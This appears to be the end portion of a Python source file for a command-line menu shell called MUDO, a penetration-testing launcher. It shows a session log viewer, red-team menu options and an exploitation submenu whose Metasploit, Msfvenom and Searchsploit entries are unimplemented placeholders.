    if not os.path.exists(SESSION_LOG_FILE):
        print(f"{RED}No session log found at {SESSION_LOG_FILE}.{RESET}")
        return

    try:
        with open(SESSION_LOG_FILE, "r", encoding="utf-8") as log_file:
            entries = log_file.read().splitlines()
    except OSError as exc:
        print(f"{RED}Could not read session log: {exc}{RESET}")
        return

    if not entries:
        print(f"{RED}Session log is empty.{RESET}")
        return

    print(f"\n{RED}SESSION LOG{RESET}")
    for entry in entries:
        if entry.startswith("[") and "]" in entry:
            timestamp, _, message = entry.partition("]")
            print(f"{BLUE}{timestamp}]{RESET}{RED}{message}{RESET}")
        else:
            print(f"{RED}{entry}{RESET}")


def show_exploitation_menu():
    while True:
        show_machine_status()
        print(f"\n{RED}════════ EXPLOITATION ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Metasploit Console")
        print(f"{BLUE}[2]{RESET} Msfvenom Payload Generator")
        print(f"{BLUE}[3]{RESET} Searchsploit")
        print(f"{BLUE}[4]{RESET} Back")

        choice = input("Choose an exploitation option: ").strip()
        if choice == "1":
            log_tool_usage("Metasploit Console")
            print(f"{GREEN}Metasploit Console placeholder selected; ready to be wired later.{RESET}")
        elif choice == "2":
            log_tool_usage("Msfvenom Payload Generator")
            print(f"{GREEN}Msfvenom placeholder selected; ready to be wired later.{RESET}")
        elif choice == "3":
            log_tool_usage("Searchsploit")
            print(f"{GREEN}Searchsploit placeholder selected; ready to be wired later.{RESET}")
        elif choice == "4":
            return
        else:
            print(f"{RED}Invalid exploitation option.{RESET}")


def show_hacking_menu():
    global BANNER_SHOWN
    while True:
        if not BANNER_SHOWN:
            print_mudo_banner()
            BANNER_SHOWN = True
        show_machine_status()
        print(f"\n{RED}════════ RED TEAM ════════{RESET}")
        print(f"{BLUE}[1]{RESET} Web Hacking")
        print(f"{BLUE}[2]{RESET} Network Hacking")
        print(f"{BLUE}[3]{RESET} Social Engineering")
        print(f"{BLUE}[4]{RESET} Password Attacks")
        print(f"{BLUE}[5]{RESET} OSINT")
        print(f"{BLUE}[6]{RESET} Malware")
        print(f"{BLUE}[7]{RESET} Exploitation")
        print(f"\n{RED}════════ TOOLS ════════{RESET}")
        print(f"{BLUE}[8]{RESET} Black Hat")
        print(f"{BLUE}[9]{RESET} Notes")
        print(f"{BLUE}[10]{RESET} Network Diagnostics")
        print(f"{BLUE}[11]{RESET} Tool Checker")
        print(f"{BLUE}[12]{RESET} Report Generator")
        print(f"{BLUE}[13]{RESET} VPN Checker")
        print(f"{BLUE}[14]{RESET} Session Log Viewer")
        print(f"{BLUE}[15]{RESET} Add Tool")
        print(f"\n{RED}════════════════════════{RESET}")
        print(f"{RED}[16]{RESET} Exit")

        choice = input("Choose an option: ").strip()

        if choice == "1":
            show_web_hacking_menu()
        elif choice == "2":
            show_network_hacking_menu()
        elif choice == "3":
            show_social_engineering_menu()
        elif choice == "4":
            show_password_attacks_menu()
        elif choice == "5":
            show_osint_menu()
        elif choice == "6":
            show_malware_menu()
        elif choice == "7":
            show_exploitation_menu()
        elif choice == "8":
            show_black_hat_menu()
        elif choice == "9":
            log_tool_usage("Notes")
            notes_menu()
        elif choice == "10":
            log_tool_usage("Network Diagnostics")
            show_network_diagnostics()
        elif choice == "11":
            log_tool_usage("Tool Checker")
            show_tool_checker()
        elif choice == "12":
            log_tool_usage("Report Generator")
            generate_session_report()
        elif choice == "13":
            log_tool_usage("VPN Checker")
            check_vpn_status()
        elif choice == "14":
            log_tool_usage("Session Log Viewer")
            view_session_log()
        elif choice == "15":
            log_tool_usage("Add Tool")
            open_vscode()
        elif choice == "16":
            log_tool_usage("Exit")
            print(f"{RED}Exiting menu...{RESET}")
            return
        else:
            print(f"{RED}Invalid option.{RESET}")



def main():
    global BANNER_SHOWN
    print_mudo_banner()
    BANNER_SHOWN = True
    print(f"{GREEN}Welcome to MUDO - open security toolkit.{RESET}")
    try:
        show_hacking_menu()
    except KeyboardInterrupt:
        print(f"\n{RED}Interrupted. Exiting MUDO.{RESET}")


if __name__ == "__main__":
    main()
